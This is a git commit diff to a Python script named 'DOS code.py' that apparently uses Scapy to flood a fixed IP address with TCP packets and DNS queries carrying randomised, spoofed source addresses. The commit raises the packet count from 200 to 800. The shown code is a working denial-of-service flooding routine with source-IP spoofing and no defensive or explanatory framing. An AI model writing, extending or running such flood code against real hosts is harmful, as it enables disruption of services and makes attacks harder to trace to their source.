39529e9e8a30cbd02aba30c1a5704e5fe7f15751
Anandhu2231 <40719852+anandhu2231@users.noreply.github.com>
2024-05-16 13:56:19 +0530

    Update DOS code.py

--- DOS code.py
+++ DOS code.py
@@ -3,12 +3,10 @@ import random
 
 # Define destination IP
 dst_ip = "192.168.204.136"
-
 # Define source port
 source_port = 2911
-
-# Total number of packets (modify as needed)
-total_packets = 200  # Change this to control the total number of packets sent
+# Total number of packets 
+total_packets = 800  # 
 
 for _ in range(total_packets):
   # Randomly choose TCP or DNS
@@ -21,5 +19,4 @@ for _ in range(total_packets):
     packet = IP(src=RandIP(), dst=dst_ip)/UDP(sport=source_port, dport=53)/DNS(rd=1, qd=DNSQR(qname=random_name, qtype="A"))
   # Send the packet directly
   send(packet)
-
 print(f"Sent {total_packets} mixed TCP and DNS packets to {dst_ip} from source port {source_port}")
